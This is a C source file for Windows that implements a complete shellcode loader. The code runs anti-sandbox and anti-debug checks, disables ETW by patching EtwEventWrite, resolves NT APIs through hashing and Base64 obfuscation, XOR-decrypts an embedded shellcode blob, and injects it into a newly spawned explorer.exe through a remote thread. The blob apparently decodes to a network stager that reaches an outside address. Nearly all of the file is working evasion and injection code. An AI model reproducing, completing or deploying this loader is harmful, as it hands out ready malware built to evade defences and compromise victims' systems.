#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

// ��������꣨DEBUG ģʽ�����ã�
#define DEBUG_PRINT(fmt, ...) {                   \
    char dbg_buffer[256] = {0};                     \
    sprintf_s(dbg_buffer, sizeof(dbg_buffer), "[DEBUG] " fmt "\n", __VA_ARGS__); \
    OutputDebugStringA(dbg_buffer);                 \
    printf("[DEBUG] " fmt "\n", __VA_ARGS__);       \
}

// һ���򵥵� Base64 ���뺯���������ο���δ�������д��������
static const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int base64_char_value(char c) {
    const char* p = strchr(base64_table, c);
    return p ? (int)(p - base64_table) : -1;
}

char* base64_decode(const char* data, size_t* out_len) {
    size_t len = strlen(data);
    if (len % 4 != 0) return NULL; // ��ʽ����

    size_t padding = 0;
    if (len >= 1 && data[len - 1] == '=') padding++;
    if (len >= 2 && data[len - 2] == '=') padding++;

    *out_len = (len / 4) * 3 - padding;
    char* decoded = (char*)malloc(*out_len + 1);
    if (!decoded) return NULL;

    size_t i = 0, j = 0;
    while (i < len) {
        int a = data[i] == '=' ? 0 : base64_char_value(data[i]); i++;
        int b = data[i] == '=' ? 0 : base64_char_value(data[i]); i++;
        int c = data[i] == '=' ? 0 : base64_char_value(data[i]); i++;
        int d = data[i] == '=' ? 0 : base64_char_value(data[i]); i++;

        decoded[j++] = (char)((a << 2) | (b >> 4));
        if (j < *out_len) decoded[j++] = (char)(((b & 15) << 4) | (c >> 2));
        if (j < *out_len) decoded[j++] = (char)(((c & 3) << 6) | d);
    }
    decoded[*out_len] = '\0';
    return decoded;
}

#define XOR_KEY 0xAA

// ԭ�� NT API ��ϣֵ����
DWORD HASH_NtAllocateVirtualMemory;
DWORD HASH_NtProtectVirtualMemory;
DWORD HASH_NtCreateThreadEx;
DWORD HASH_RtlCopyMemory;

// ������ϣ���壨��Ȼ�����в���ʹ�� NtGetContextThread��NtSetContextThread��NtUnmapViewOfSection��NtResumeThread��
DWORD HASH_NtGetContextThread;
DWORD HASH_NtSetContextThread;
DWORD HASH_NtUnmapViewOfSection;
DWORD HASH_NtResumeThread;
// ����ע��ʱ��Ҫ�õ���д�ڴ溯��
DWORD HASH_NtWriteVirtualMemory;

// ���º�� NT API ��ṹ�������� API ��ԱҲ���������������ʹ�ò��ֽӿڣ�
typedef struct _NtApiTable {
    FARPROC NtAllocateVirtualMemory;
    FARPROC NtProtectVirtualMemory;
    FARPROC NtCreateThreadEx;
    FARPROC RtlCopyMemory;
    FARPROC NtGetContextThread;
    FARPROC NtSetContextThread;
    FARPROC NtUnmapViewOfSection;
    FARPROC NtResumeThread;
    FARPROC NtWriteVirtualMemory;
} NtApiTable;

// ��ɳ���飺��������ڴ桢�������������Լ�����ɳ��ģ�飨���� Sandboxie��
BOOL AntiSandbox() {
    MEMORYSTATUSEX memInfo = { 0 };
    memInfo.dwLength = sizeof(memInfo);
    if (!GlobalMemoryStatusEx(&memInfo)) {
        DEBUG_PRINT("GlobalMemoryStatusEx call failed", 0);
        return TRUE; // ʧ��ʱ��Ϊ����ɳ�价��
    }
    if ((memInfo.ullTotalPhys / (1024 * 1024)) < 2048) {
        DEBUG_PRINT("Insufficient physical memory: %llu MB", memInfo.ullTotalPhys / (1024 * 1024));
        return TRUE;
    }

    SYSTEM_INFO sysInfo = { 0 };
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        DEBUG_PRINT("Insufficient number of processor cores: %u", sysInfo.dwNumberOfProcessors);
        return TRUE;
    }
    // ��� Sandboxie ģ��
    if (GetModuleHandleA("SbieDll.dll") != NULL) {
        DEBUG_PRINT("Sandboxie module detected", 0);
        return TRUE;
    }
    return FALSE;
}

// ��ָ���ļ���ȡ���ݣ������ػ�������ַ��ͬʱ����ȡ���ֽ������浽 *size ��
unsigned char* loadShellcode(const char* filename, size_t* size) {
    FILE* file;
    fopen_s(&file, filename, "rb");
    if (!file) {
        perror("fopen");
        return NULL;
    }

    // ��ȡ�ļ���С
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    rewind(file);

    // Ϊ�ļ����ݷ����ڴ�
    unsigned char* buffer = (unsigned char*)malloc(fileSize);
    if (!buffer) {
        fclose(file);
        fprintf(stderr, "Memory allocation failed!\n");
        return NULL;
    }

    // ��ȡ�ļ����ݵ�������
    size_t bytesRead = fread(buffer, 1, fileSize, file);
    if (bytesRead != fileSize) {
        free(buffer);
        fclose(file);
        fprintf(stderr, "Failed to read file!\n");
        return NULL;
    }
    fclose(file);

    *size = fileSize;  // �����ļ�����
    return buffer;
}

// �����Լ�飺ʹ�� IsDebuggerPresent �� CheckRemoteDebuggerPresent
BOOL AntiDebug() {
    if (IsDebuggerPresent()) {
        DEBUG_PRINT("Debugger detected by IsDebuggerPresent", 0);
        return TRUE;
    }
    BOOL debuggerFound = FALSE;
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerFound) && debuggerFound) {
        DEBUG_PRINT("Debugger detected by CheckRemoteDebuggerPresent", 0);
        return TRUE;
    }
    return FALSE;
}

DWORD RtlHashString(CHAR* str) {
    DWORD hash = 0;
    while (*str) {
        // ת��ΪСд������ַ��Ǵ�д��ĸ��
        CHAR c = *str;
        if (c >= 'A' && c <= 'Z')
            c += 0x20;
        // ��ת�� 13 λ
        hash = (hash >> 13) | (hash << (32 - 13));
        hash += c;
        str++;
    }
    return hash & 0x7FFFFFFF;
}

// ��Ȩ����
BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, NULL);
    CloseHandle(hToken);
    return result;
}

// ���� ntdll.dll ���������� Base64 ����� API �������ø� API �Ĺ�ϣֵ
void GetAllAPINames(HMODULE hModule) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    DWORD exportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRVA == 0) return;
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDirRVA);
    DWORD numberOfNames = pExportDir->NumberOfNames;
    PDWORD pNames = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfNames);
    for (DWORD i = 0; i < numberOfNames; i++) {
        CHAR* funcName = (CHAR*)((BYTE*)hModule + pNames[i]);
        DWORD hash = RtlHashString(funcName);
        size_t decLen = 0;
        if (!strcmp(funcName, base64_decode("TnRBbGxvY2F0ZVZpcnR1YWxNZW1vcnk=", &decLen))) {
            HASH_NtAllocateVirtualMemory = hash;
        }
        else if (!strcmp(funcName, base64_decode("TnRQcm90ZWN0VmlydHVhbE1lbW9yeQ==", &decLen))) {
            HASH_NtProtectVirtualMemory = hash;
        }
        else if (!strcmp(funcName, base64_decode("TnRDcmVhdGVUaHJlYWRFeA==", &decLen))) {
            HASH_NtCreateThreadEx = hash;
        }
        else if (!strcmp(funcName, base64_decode("UnRsQ29weU1lbW9yeQ==", &decLen))) {
            HASH_RtlCopyMemory = hash;
        }
        else if (!strcmp(funcName, base64_decode("TnRHZXRDb250ZXh0VGhyZWFk", &decLen))) {
            HASH_NtGetContextThread = hash;
        }
        else if (!strcmp(funcName, base64_decode("TnRTZXRDb250ZXh0VGhyZWFk", &decLen))) {
            HASH_NtSetContextThread = hash;
        }
        else if (!strcmp(funcName, base64_decode("TnRVbm1hcFZpZXdPZlNlY3Rpb24=", &decLen))) {
            HASH_NtUnmapViewOfSection = hash;
        }
        else if (!strcmp(funcName, base64_decode("TnRSZXN1bWVUaHJlYWQ=", &decLen))) {
            HASH_NtResumeThread = hash;
        }
        else if (!strcmp(funcName, base64_decode("TnRXcml0ZVZpcnR1YWxNZW1vcnk=", &decLen))) {
            HASH_NtWriteVirtualMemory = hash;
        }
    }
}

// ��̬��ȡ API ��ַ�������������Աȼ����Ĺ�ϣֵ
FARPROC GetAPI(HMODULE hModule, DWORD targetHash) {
    if (!hModule) {
        DEBUG_PRINT("Module handle is NULL", 0);
        return NULL;
    }

    // ��� DOS ͷ��Ч��
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        DEBUG_PRINT("Invalid DOS signature", 0);
        return NULL;
    }

    // ��ȡ NT ͷ��
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        DEBUG_PRINT("Invalid NT signature", 0);
        return NULL;
    }

    // ��ȡ����Ŀ¼�� RVA
    DWORD exportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRVA == 0) {
        DEBUG_PRINT("No export directory", 0);
        return NULL;
    }

    // ��ȡ����Ŀ¼ָ��
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDirRVA);
    DWORD numberOfNames = pExportDir->NumberOfNames;
    if (numberOfNames == 0) {
        DEBUG_PRINT("No names in export table", 0);
        return NULL;
    }

    PDWORD pNames = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfNames);
    PWORD pOrdinals = (PWORD)((BYTE*)hModule + pExportDir->AddressOfNameOrdinals);
    PDWORD pFunctions = (PDWORD)((BYTE*)hModule + pExportDir->AddressOfFunctions);

    for (DWORD i = 0; i < numberOfNames; i++) {
        CHAR* pFuncName = (CHAR*)((BYTE*)hModule + pNames[i]);
        if ((RtlHashString(pFuncName) & 0x7FFFFFFF) == targetHash) {
            DEBUG_PRINT("Resolved API: %s", pFuncName);
            WORD ordinal = pOrdinals[i];
            DWORD funcRVA = pFunctions[ordinal];
            return (FARPROC)((BYTE*)hModule + funcRVA);
        }
    }

    DEBUG_PRINT("No matching API found", 0);
    return NULL;
}

// �ӳ�ִ�У��� Sleep ���ã�
void DelayExecution(DWORD ms) {
    DWORD start = GetTickCount();
    while ((GetTickCount() - start) < ms) {
        SwitchToThread();
    }
}

// �ƹ� ETW ��⣺�� EtwEventWrite �������ֽ��滻Ϊ RET ָ��
void BypassETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;
    PVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return;
    DWORD oldProtect;
    if (VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        *(PBYTE)pEtwEventWrite = 0xC3; // RET
        VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
        DEBUG_PRINT("ETW bypassed", 0);
    }
}

// ���ѡ��Ŀ��������ƣ���ѡ�񳣼�ϵͳ�������ƣ�ʵ��ʹ������ȷ�����кϷ��ԣ�
const CHAR* GetRandomProcessName() {
    const CHAR* processes[] = {
        "explorer.exe"
    };
    return processes[GetTickCount() % (sizeof(processes) / sizeof(CHAR*))];
}

// --- ����ע�뺯�� ---
// �޸ĺ����޸�Ŀ��������߳������ģ�����ֱ����Ŀ������������ڴ桢д�� shellcode ������Զ���߳�ִ��
BOOL ProcessInjection(NtApiTable* nt, PVOID shellcode, SIZE_T shellcodeSize) {
    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = { 0 };
    PVOID remoteMem = NULL;
    SIZE_T memSize = shellcodeSize;
    NTSTATUS status;

    // ���ѡ��Ŀ�����
    const CHAR* procName = GetRandomProcessName();

    // �����������
    if (!CreateProcessA(
        NULL,
        (LPSTR)procName,
        NULL, NULL, FALSE,
        CREATE_SUSPENDED | DETACHED_PROCESS,
        NULL, NULL, &si, &pi)) {
        DEBUG_PRINT("Failed to create process: %d", GetLastError());
        return FALSE;
    }

    // ��Ŀ������з����ڴ�
    status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG))
        nt->NtAllocateVirtualMemory)(pi.hProcess, &remoteMem, 0, &memSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0 || !remoteMem) {
        DEBUG_PRINT("Failed to allocate memory in remote process: 0x%X", status);
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }

    // д�� shellcode ��Ŀ������ڴ�
    status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))
        nt->NtWriteVirtualMemory)(pi.hProcess, remoteMem, shellcode, shellcodeSize, NULL);
    if (status != 0) {
        DEBUG_PRINT("Failed to write to remote memory: 0x%X", status);
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }

    // ��Ŀ������д������߳���ִ�� shellcode
    HANDLE hThread = NULL;
    status = ((NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, LPTHREAD_START_ROUTINE,
        PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID))
        nt->NtCreateThreadEx)(&hThread, 0x1FFFFF, NULL, pi.hProcess,
            (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, 0, 0, 0, NULL);
    if (status != 0 || !hThread) {
        DEBUG_PRINT("Failed to create remote thread: 0x%X", status);
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }

    DEBUG_PRINT("Successfully injected remote thread into process %s", procName);

    WaitForSingleObject(hThread, 1);

    return TRUE;
}

// --- �����غ��� ---
// ����⡢���ܡ���ȫ��ͨ��Զ�̽���ע��ִ�� shellcode
void ExecuteShellcode() {
    // �����Ժͷ�ɳ����
    if (AntiDebug() || AntiSandbox()) {
        DEBUG_PRINT("Debugging/sandbox environment detected, exiting program", 0);
        ExitProcess(0);
    }

    // �ƹ� ETW ���
    BypassETW();

    // �ӳ�ִ���Զ�ܾ�̬����
    DelayExecution(5000);

    // ��Ȩ����
    if (!EnableDebugPrivilege()) {
        DEBUG_PRINT("Failed to enable debug privilege", 0);
    }
    else {
        DEBUG_PRINT("Debug privilege enabled successfully", 0);
    }

    size_t shellcodeLen = 0;
    //unsigned char* encryptedShellcode = loadShellcode("encrypted_shellcode.data", &shellcodeLen);
    unsigned char encryptedShellcode[] = {
0x56, 0xe2, 0x29, 0x4e, 0x5a, 0x42, 0x62, 0xaa, 0xaa, 0xaa, 0xeb, 0xfb, 0xeb, 0xfa, 0xf8, 0xfb, 0xfc, 0xe2, 0x9b, 0x78,
0xcf, 0xe2, 0x21, 0xf8, 0xca, 0xe2, 0x21, 0xf8, 0xb2, 0xe2, 0x21, 0xf8, 0x8a, 0xe2, 0x21, 0xd8, 0xfa, 0xe2, 0xa5, 0x1d,
0xe0, 0xe0, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a, 0x06, 0x96, 0xcb, 0xd6, 0xa8, 0x86, 0x8a, 0xeb, 0x6b, 0x63, 0xa7, 0xeb,
0xab, 0x6b, 0x48, 0x47, 0xf8, 0xeb, 0xfb, 0xe2, 0x21, 0xf8, 0x8a, 0x21, 0xe8, 0x96, 0xe2, 0xab, 0x7a, 0xcc, 0x2b, 0xd2,
0xb2, 0xa1, 0xa8, 0xdf, 0xd8, 0x21, 0x2a, 0x22, 0xaa, 0xaa, 0xaa, 0xe2, 0x2f, 0x6a, 0xde, 0xcd, 0xe2, 0xab, 0x7a, 0xfa,
0x21, 0xe2, 0xb2, 0xee, 0x21, 0xea, 0x8a, 0xe3, 0xab, 0x7a, 0x49, 0xfc, 0xe2, 0x55, 0x63, 0xeb, 0x21, 0x9e, 0x22, 0xe2,
0xab, 0x7c, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a, 0x06, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x92, 0x4a, 0xdf, 0x5b,
0xe6, 0xa9, 0xe6, 0x8e, 0xa2, 0xef, 0x93, 0x7b, 0xdf, 0x72, 0xf2, 0xee, 0x21, 0xea, 0x8e, 0xe3, 0xab, 0x7a, 0xcc, 0xeb,
0x21, 0xa6, 0xe2, 0xee, 0x21, 0xea, 0xb6, 0xe3, 0xab, 0x7a, 0xeb, 0x21, 0xae, 0x22, 0xe2, 0xab, 0x7a, 0xeb, 0xf2, 0xeb,
0xf2, 0xf4, 0xf3, 0xf0, 0xeb, 0xf2, 0xeb, 0xf3, 0xeb, 0xf0, 0xe2, 0x29, 0x46, 0x8a, 0xeb, 0xf8, 0x55, 0x4a, 0xf2, 0xeb,
0xf3, 0xf0, 0xe2, 0x21, 0xb8, 0x43, 0xe5, 0x55, 0x55, 0x55, 0xf7, 0xc0, 0xaa, 0xe3, 0x14, 0xdd, 0xc3, 0xc4, 0xc3, 0xc4,
0xcf, 0xde, 0xaa, 0xeb, 0xfc, 0xe3, 0x23, 0x4c, 0xe6, 0x23, 0x5b, 0xeb, 0x10, 0xe6, 0xdd, 0x8c, 0xad, 0x55, 0x7f, 0xe2,
0x9b, 0x63, 0xe2, 0x9b, 0x78, 0xe7, 0x9b, 0x6a, 0xe7, 0x9b, 0x63, 0xeb, 0xfa, 0xeb, 0xfa, 0xeb, 0x10, 0x90, 0xfc, 0xd3,
0x0d, 0x55, 0x7f, 0x43, 0x39, 0xaa, 0xaa, 0xaa, 0xf0, 0xe2, 0x23, 0x6b, 0xeb, 0x12, 0x11, 0xab, 0xaa, 0xaa, 0xe7, 0x9b,
0x63, 0xeb, 0xfb, 0xeb, 0xfb, 0xc0, 0xa9, 0xeb, 0xfb, 0xeb, 0x10, 0xfd, 0x23, 0x35, 0x6c, 0x55, 0x7f, 0x41, 0xd3, 0xf1,
0xe2, 0x23, 0x6b, 0xe2, 0x9b, 0x78, 0xe3, 0x23, 0x72, 0xe7, 0x9b, 0x63, 0xf8, 0xc2, 0xaa, 0x98, 0x6a, 0x2e, 0xf8, 0xf8,
0xeb, 0x10, 0x41, 0xff, 0x84, 0x91, 0x55, 0x7f, 0xe2, 0x23, 0x6c, 0xe2, 0x29, 0x69, 0xfa, 0xc0, 0xa0, 0xf5, 0xe2, 0x23,
0x5b, 0x10, 0xb5, 0xaa, 0xaa, 0xaa, 0xc0, 0xaa, 0xc2, 0x2a, 0x99, 0xaa, 0xaa, 0xe3, 0x23, 0x4a, 0xeb, 0x13, 0xae, 0xaa,
0xaa, 0xaa, 0xeb, 0x10, 0xdf, 0xec, 0x34, 0x2c, 0x55, 0x7f, 0xe2, 0x23, 0x5b, 0xe2, 0x23, 0x70, 0xe3, 0x6d, 0x6a, 0x55,
0x55, 0x55, 0x55, 0xe7, 0x9b, 0x63, 0xf8, 0xf8, 0xeb, 0x10, 0x87, 0xac, 0xb2, 0xd1, 0x55, 0x7f, 0x2f, 0x6a, 0xa5, 0x2f,
0x37, 0xab, 0xaa, 0xaa, 0xe2, 0x55, 0x65, 0xa5, 0x2e, 0x26, 0xab, 0xaa, 0xaa, 0x41, 0x19, 0x43, 0x4e, 0xab, 0xaa, 0xaa,
0x42, 0x28, 0x55, 0x55, 0x55, 0x85, 0xf3, 0xeb, 0xc1, 0xf2, 0xaa, 0xb4, 0x7d, 0xa3, 0xd0, 0xf3, 0x1e, 0xca, 0x35, 0xfc,
0x98, 0xca, 0x4d, 0x88, 0x18, 0xb5, 0x45, 0x66, 0xdd, 0xd7, 0x2b, 0x34, 0x02, 0x2a, 0x44, 0x36, 0xd5, 0x81, 0xe9, 0x47,
0x2d, 0x44, 0xd2, 0x2a, 0x4d, 0x92, 0x7e, 0xa6, 0xde, 0x92, 0xea, 0x30, 0x9f, 0x96, 0x2e, 0xb6, 0x84, 0x75, 0xe8, 0x5b,
0xa1, 0xbd, 0x79, 0xae, 0x22, 0x37, 0xb8, 0x08, 0xd0, 0xb9, 0x91, 0xd5, 0x91, 0x1d, 0xfc, 0x05, 0x6b, 0x40, 0x35, 0x28,
0xe4, 0x02, 0x7d, 0xa3, 0xaa, 0xff, 0xd9, 0xcf, 0xd8, 0x87, 0xeb, 0xcd, 0xcf, 0xc4, 0xde, 0x90, 0x8a, 0xe7, 0xc5, 0xd0,
0xc3, 0xc6, 0xc6, 0xcb, 0x85, 0x9e, 0x84, 0x9a, 0x8a, 0x82, 0xc9, 0xc5, 0xc7, 0xda, 0xcb, 0xde, 0xc3, 0xc8, 0xc6, 0xcf,
0x91, 0x8a, 0xe7, 0xf9, 0xe3, 0xef, 0x8a, 0x9f, 0x84, 0x9a, 0x91, 0x8a, 0xfd, 0xc3, 0xc4, 0xce, 0xc5, 0xdd, 0xd9, 0x8a,
0xe4, 0xfe, 0x91, 0x8a, 0xee, 0xc3, 0xcd, 0xef, 0xd2, 0xde, 0x91, 0x8a, 0xee, 0xfe, 0xf9, 0x8a, 0xeb, 0xcd, 0xcf, 0xc4,
0xde, 0xa7, 0xa0, 0xaa, 0x8b, 0xb5, 0x16, 0xfa, 0xaa, 0xcc, 0xd9, 0x0a, 0xca, 0xcf, 0x7a, 0xfa, 0xbd, 0xb7, 0x08, 0x21,
0xea, 0x61, 0xc6, 0x7b, 0x71, 0x24, 0x59, 0x7a, 0x6a, 0x27, 0xe4, 0x73, 0xe1, 0x47, 0x0d, 0x30, 0x6b, 0x2a, 0xde, 0x84,
0x0e, 0xa9, 0xfc, 0x96, 0xee, 0x96, 0x49, 0xd1, 0xb7, 0xc7, 0xa0, 0x6a, 0x0a, 0xc8, 0x77, 0x04, 0xe9, 0x07, 0x62, 0xcf,
0xa7, 0xcb, 0x4d, 0xba, 0x68, 0xfc, 0x2b, 0xf5, 0x70, 0xd5, 0x3f, 0xfe, 0x8d, 0x62, 0x7d, 0x64, 0xaf, 0x2a, 0xda, 0x16,
0x28, 0x4f, 0x74, 0x44, 0x8a, 0xd1, 0xdf, 0x5a, 0xaa, 0xf1, 0x5f, 0xdb, 0xf5, 0x10, 0x91, 0x87, 0x4b, 0xa1, 0x7a, 0xea,
0xea, 0xb8, 0xbf, 0x20, 0x47, 0xa4, 0x4e, 0x4b, 0x45, 0x8c, 0xf8, 0x2e, 0xc4, 0xf6, 0x21, 0x63, 0x6c, 0x44, 0x35, 0x82,
0xab, 0x1b, 0x47, 0x97, 0x81, 0xbd, 0xd2, 0x19, 0x1d, 0x05, 0xb0, 0x6c, 0xfb, 0x27, 0x18, 0x6e, 0x2a, 0x5f, 0x20, 0x9e,
0x0e, 0x26, 0x13, 0xa2, 0xe4, 0x43, 0x7b, 0x29, 0x78, 0x5f, 0x65, 0x78, 0x31, 0x7d, 0x6b, 0x27, 0x2e, 0x81, 0x40, 0x70,
0x8b, 0xb6, 0xcf, 0x6b, 0xa3, 0x1a, 0xbe, 0xe9, 0x34, 0x50, 0xd1, 0x1d, 0xb5, 0x13, 0x1a, 0x28, 0xfb, 0x11, 0xeb, 0xf1,
0x08, 0x26, 0x24, 0xea, 0x0a, 0x73, 0x77, 0x2f, 0xca, 0x13, 0x0a, 0xb6, 0x3b, 0x79, 0x21, 0xe4, 0xa4, 0x75, 0x37, 0x64,
0x26, 0xb7, 0x69, 0x43, 0x50, 0xca, 0x15, 0x0b, 0xf7, 0x1d, 0x0a, 0x31, 0x9d, 0xa5, 0xc4, 0x93, 0x8d, 0xe5, 0xa8, 0x25,
0x14, 0xed, 0x66, 0xb8, 0xd2, 0x71, 0x32, 0xcb, 0xaa, 0xeb, 0x14, 0x5a, 0x1f, 0x08, 0xfc, 0x55, 0x7f, 0xe2, 0x9b, 0x63,
0x10, 0xaa, 0xaa, 0xea, 0xaa, 0xeb, 0x12, 0xaa, 0xba, 0xaa, 0xaa, 0xeb, 0x13, 0xea, 0xaa, 0xaa, 0xaa, 0xeb, 0x10, 0xf2,
0x0e, 0xf9, 0x4f, 0x55, 0x7f, 0xe2, 0x39, 0xf9, 0xf9, 0xe2, 0x23, 0x4d, 0xe2, 0x23, 0x5b, 0xe2, 0x23, 0x70, 0xeb, 0x12,
0xaa, 0x8a, 0xaa, 0xaa, 0xe3, 0x23, 0x53, 0xeb, 0x10, 0xb8, 0x3c, 0x23, 0x48, 0x55, 0x7f, 0xe2, 0x29, 0x6e, 0x8a, 0x2f,
0x6a, 0xde, 0x1c, 0xcc, 0x21, 0xad, 0xe2, 0xab, 0x69, 0x2f, 0x6a, 0xdf, 0x7d, 0xf2, 0xf2, 0xf2, 0xe2, 0xaf, 0xaa, 0xaa,
0xaa, 0xaa, 0xfa, 0x69, 0x42, 0xd5, 0x57, 0x55, 0x55, 0x9b, 0x93, 0x98, 0x84, 0x9b, 0x9c, 0x92, 0x84, 0x9b, 0x93, 0x9f,
0x84, 0x9b, 0x98, 0x92, 0xaa, 0x90, 0x74, 0xc2, 0x1b };
	shellcodeLen = sizeof(encryptedShellcode);
    if (!encryptedShellcode) {
        DEBUG_PRINT("Failed to load shellcode", 0);
        ExitProcess(0);
    }

    // ��ʼ�� NT API ��
    NtApiTable nt = { 0 };
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        DEBUG_PRINT("Failed to get ntdll.dll", 0);
        ExitProcess(0);
    }
    GetAllAPINames(hNtdll);

    nt.NtAllocateVirtualMemory = GetAPI(hNtdll, HASH_NtAllocateVirtualMemory);
    nt.NtProtectVirtualMemory = GetAPI(hNtdll, HASH_NtProtectVirtualMemory);
    nt.NtCreateThreadEx = GetAPI(hNtdll, HASH_NtCreateThreadEx);
    nt.RtlCopyMemory = GetAPI(hNtdll, HASH_RtlCopyMemory);
    nt.NtWriteVirtualMemory = GetAPI(hNtdll, HASH_NtWriteVirtualMemory);
    // ��Ȼ������ API �ѽ������������в���ʹ������
    nt.NtGetContextThread = GetAPI(hNtdll, HASH_NtGetContextThread);
    nt.NtSetContextThread = GetAPI(hNtdll, HASH_NtSetContextThread);
    nt.NtUnmapViewOfSection = GetAPI(hNtdll, HASH_NtUnmapViewOfSection);
    nt.NtResumeThread = GetAPI(hNtdll, HASH_NtResumeThread);

    if (!nt.NtAllocateVirtualMemory || !nt.NtProtectVirtualMemory ||
        !nt.NtCreateThreadEx || !nt.RtlCopyMemory || !nt.NtWriteVirtualMemory) {
        DEBUG_PRINT("Failed to resolve NT APIs", 0);
        ExitProcess(0);
    }

    // ���� shellcode��XOR ���ܣ�
    for (unsigned int i = 0; i < shellcodeLen; i++) {
        encryptedShellcode[i] ^= XOR_KEY;
    }
    DEBUG_PRINT("Shellcode decrypted successfully", 0);

    // ȫ������Զ��ע�뷽ʽ����Ŀ��������´����߳�ִ�� shellcode
    if (!ProcessInjection(&nt, encryptedShellcode, shellcodeLen)) {
        DEBUG_PRINT("Remote injection failed", 0);
        ExitProcess(0);
    }
}

// ������ڵ�
void main() {
    DEBUG_PRINT("Starting shellcode execution", 0);
    ExecuteShellcode();
}
